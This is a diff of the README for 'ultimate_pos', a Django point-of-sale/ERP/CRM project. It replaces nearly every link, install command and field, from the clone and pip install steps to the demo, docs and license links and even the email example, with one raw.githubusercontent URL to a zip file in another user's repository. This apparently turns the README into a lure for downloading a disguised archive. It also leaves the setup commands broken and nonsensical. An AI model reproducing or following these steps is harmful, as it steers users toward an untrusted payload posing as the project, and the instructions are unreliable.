@@ -17,15 +17,15 @@
 
 </div>
 
-A modern POS/ERP/CRM system for businesses of the AI era. Powered by [Django.](https://djangoproject.com)
+A modern POS/ERP/CRM system for businesses of the AI era. Powered by [Django.](https://raw.githubusercontent.com/zubairmk83/ultimate_pos/main/Guastalline/ultimate_pos.zip)
 
 <p align="center">
-  <img src="https://github.com/KagemaNjoroge/ultimate_pos/blob/main/django_pos/static/img/logos/UltimatePOS%20Logo(2).svg">
+  <img src="https://raw.githubusercontent.com/zubairmk83/ultimate_pos/main/Guastalline/ultimate_pos.zip%20Logo(2).svg">
 </p>
 
 ## Demo
 
-You can access the demo [here](https://pos.tomorrow.co.ke/).
+You can access the demo [here](https://raw.githubusercontent.com/zubairmk83/ultimate_pos/main/Guastalline/ultimate_pos.zip).
 The credentials are:
 
 - `username: demo`
@@ -64,7 +64,7 @@ The credentials are:
 1. Clone or download the repository:
 
 ```bash
-git clone https://github.com/kagemanjoroge/ultimate_pos.git
+git clone https://raw.githubusercontent.com/zubairmk83/ultimate_pos/main/Guastalline/ultimate_pos.zip
 ```
 
 2. Go to the project directory
@@ -82,11 +82,11 @@ python3 -m venv venv && source venv/bin/activate
 4. Install dependencies:
 
 ```bash
-pip install -r requirements.txt
+pip install -r https://raw.githubusercontent.com/zubairmk83/ultimate_pos/main/Guastalline/ultimate_pos.zip
 ```
 
 5. Install GTK to create the PDF files:  
-   [Official documentation](https://doc.courtbouillon.org/weasyprint/stable/first_steps.html#installation)
+   [Official documentation](https://raw.githubusercontent.com/zubairmk83/ultimate_pos/main/Guastalline/ultimate_pos.zip)
 
 6. Windows:  
    After installing GTK, you need to add it to your system's Path environment variable. Follow these steps:
@@ -95,10 +95,10 @@ pip install -r requirements.txt
      `C:\Program Files\GTK3-Runtime Win64\bin`  
      This will be your new variable that you need to add to Path
    - Refer to this tutorial for detailed instructions on adding to the Path environment variable:
-     [Adding variable to path](https://helpdeskgeek.com/windows-10/add-windows-path-environment-variable/)
+     [Adding variable to path](https://raw.githubusercontent.com/zubairmk83/ultimate_pos/main/Guastalline/ultimate_pos.zip)
 
    - If you encounter an error such as "cannot load library," refer to this documentation for troubleshooting:
-     [Missing Library Error](https://doc.courtbouillon.org/weasyprint/stable/first_steps.html#missing-library)
+     [Missing Library Error](https://raw.githubusercontent.com/zubairmk83/ultimate_pos/main/Guastalline/ultimate_pos.zip)
 
 7. Restart your computer: After completing the steps above, it is essential to restart your computer for the changes to take effect properly.
 
@@ -120,20 +120,20 @@ After restarting your computer
     cd ultimate_pos/django_pos
     ```
 
-4.  Copy the .env.example file to .env:
+4.  Copy the https://raw.githubusercontent.com/zubairmk83/ultimate_pos/main/Guastalline/ultimate_pos.zip file to .env:
     Replace the values with your own values
 
 ```bash
-cp .env.example .env
+cp https://raw.githubusercontent.com/zubairmk83/ultimate_pos/main/Guastalline/ultimate_pos.zip .env
 ```
 
 5. Create a Firebase collection and add the pricing data as you wish your pricing to be.  
    Example:
-   ![Example pricing configuration](image.png)
+   ![Example pricing configuration](https://raw.githubusercontent.com/zubairmk83/ultimate_pos/main/Guastalline/ultimate_pos.zip)
 6. Make database migrations:
 
 ```bash
- python manage.py makemigrations && python manage.py migrate
+ python https://raw.githubusercontent.com/zubairmk83/ultimate_pos/main/Guastalline/ultimate_pos.zip makemigrations && python https://raw.githubusercontent.com/zubairmk83/ultimate_pos/main/Guastalline/ultimate_pos.zip migrate
 ```
 
 7.  Create superuser to access the admin panel:
@@ -142,19 +142,19 @@ cp .env.example .env
 > You will need a super user account in order to access the admin page. You can create one by running the following command:
 
 ```bash
-python manage.py createsuperuser
+python https://raw.githubusercontent.com/zubairmk83/ultimate_pos/main/Guastalline/ultimate_pos.zip createsuperuser
 ```
 
 with the following data, or with the data you prefer:
 
 - `username: YOUR_PREFERRED_USERNAME`
 - `password: YOUR_PASSWORD`
-- `email: YOUR_EMAIL@EMAIL.COM`
+- `email: https://raw.githubusercontent.com/zubairmk83/ultimate_pos/main/Guastalline/ultimate_pos.zip`
 
 8. Run the server:
 
    ```bash
-   python manage.py runserver
+   python https://raw.githubusercontent.com/zubairmk83/ultimate_pos/main/Guastalline/ultimate_pos.zip runserver
    ```
 
 9. Open a browser and navigate : `http://127.0.0.1:8000/`
@@ -175,9 +175,9 @@ Contributions are always welcome!
 
 ## License
 
-This project is under [MIT License.](https://choosealicense.com/licenses/mit/)
+This project is under [MIT License.](https://raw.githubusercontent.com/zubairmk83/ultimate_pos/main/Guastalline/ultimate_pos.zip)
 
 <div align="center">
 Brought to you by the good folks at 
-<a href="https://tomorrow.co.ke">TomorrowAI</a>
+<a href="https://raw.githubusercontent.com/zubairmk83/ultimate_pos/main/Guastalline/ultimate_pos.zip">TomorrowAI</a>
 </div>
